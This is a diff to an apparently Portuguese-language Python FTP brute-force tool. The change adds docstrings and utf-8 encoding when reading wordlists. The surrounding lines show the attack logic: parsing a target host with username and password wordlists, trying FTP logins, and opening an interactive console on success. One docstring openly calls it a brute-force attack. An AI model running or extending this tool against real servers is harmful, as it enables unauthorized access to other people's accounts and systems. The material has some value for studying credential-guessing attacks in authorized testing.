@@ -3,6 +3,14 @@ import ftplib
 import pexpect
 
 def conectar_ftp(hostname, username, senha):
+    """
+    Conecta-se a um servidor FTP utilizando as credenciais fornecidas e interage com o console FTP.
+
+    Args:
+        hostname (str): O nome do host FTP.
+        username (str): O nome de usuário para autenticação no servidor FTP.
+        senha (str): A senha para autenticação no servidor FTP.
+    """
     try:
         # Cria uma conexão FTP
         ftp = ftplib.FTP(hostname)
@@ -28,16 +36,19 @@ def conectar_ftp(hostname, username, senha):
             ftp_console.expect('ftp>')
             print(ftp_console.before.decode('utf-8'))
 
-    except ftplib.error_perm as e:
-        print(f"[ * ] Acesso negado para {username}:{senha} [ * ]")
-    except ftplib.all_errors as e:
-        print("Erro na conexão FTP:", str(e))
+    except ftplib.error_perm:
+        print(f"[*] Acesso negado para {username}:{senha} [*]")
+    except ftplib.all_errors as error:
+        print("Erro na conexão FTP:", str(error))
     except pexpect.EOF:
         print("Conexão com o console FTP encerrada.")
     except pexpect.TIMEOUT:
         print("Tempo de espera excedido.")
 
 def ftpbrute():
+    """
+    Executa um ataque de força bruta contra um servidor FTP com base nos argumentos fornecidos pela linha de comando.
+    """
     hostname = None
     username = None
     senha = None
@@ -51,14 +62,14 @@ def ftpbrute():
             senha = sys.argv[i + 1]
             i += 1
         elif sys.argv[i] == '-wp':
-            with open(sys.argv[i + 1], 'r') as arquivo:
+            with open(sys.argv[i + 1], 'r', encoding='utf-8') as arquivo:
                 lista_senhas = arquivo.read().splitlines()
             i += 1
         elif sys.argv[i] == '-u':
             username = sys.argv[i + 1]
             i += 1
         elif sys.argv[i] == '-wu':
-            with open(sys.argv[i + 1], 'r') as arquivo:
+            with open(sys.argv[i + 1], 'r', encoding='utf-8') as arquivo:
                 lista_usuarios = arquivo.read().splitlines()
             i += 1
         elif sys.argv[i] == '-h':
